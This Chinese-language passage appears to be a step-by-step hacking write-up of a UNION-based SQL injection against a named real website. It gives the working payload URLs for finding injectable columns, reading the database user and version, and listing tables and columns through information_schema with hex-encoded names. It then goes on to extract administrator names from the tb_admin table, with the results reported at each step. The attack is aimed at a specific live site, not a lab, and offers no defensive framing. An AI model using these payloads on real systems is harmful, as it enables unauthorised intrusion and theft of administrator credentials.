and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9 然后加上这段话爆字段的位置

访问 http://www.hc114.cn/company\_detail2.php?id=1541&nid=33 and 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9

![](../Images/9dc81abc25499b5a74c6087a052956be.png)

爆出了 2和4

然后在2和4这里查询数据库信息

查询 use()数据库当前用户： hc114@localhost database() 当前数据库： db\_hc114  
version()数据库版本 5.0.86-log  
既然是PHP的站 对应的数据库应该是MySQL的

Mysql 5 以上有内置库 information\_schema，存储着mysql的所有数据库和表结构信息

直接爆表名

http://www.hc114.cn/company\_detail2.php?id=1541&nid=33 and 1=2 UNION SELECT 1,group\_concat(table\_name),3,4,5,6,7,8,9 from information\_schema.tables where table\_schema=0x64625F6863313134

information\_schema.tables // information\_schema库中的表  
where //后面接着查询条件  
table\_schema=0x64625F6863313134 // 后面的要用HEX加密才可以 我用的是小葵编码转换

![](../Images/cdac4348ff7e49ed44e7e5aad17fb82e.png)

爆出来一堆表 有用的就是 tb\_admin admin表

继续列明

http://www.hc114.cn/company\_detail2.php?id=1541&nid=33 and 1=2 UNION SELECT 1,column\_name,3,4,5,6,7,8,9 from information\_schema.columns where table\_name=0x74625F61646D696E

同样需要加密HEX的

爆出来 admin\_id 列名

![](../Images/a18fa97788b35ae598d3f46a1dfdd7be.png)

http://www.hc114.cn/company\_detail2.php?id=1541&nid=33 and 1=2 UNION SELECT 1,admin\_name,3,4,5,6,7,8,9 from db\_hc114.tb\_admin

这个直接查列里的数据
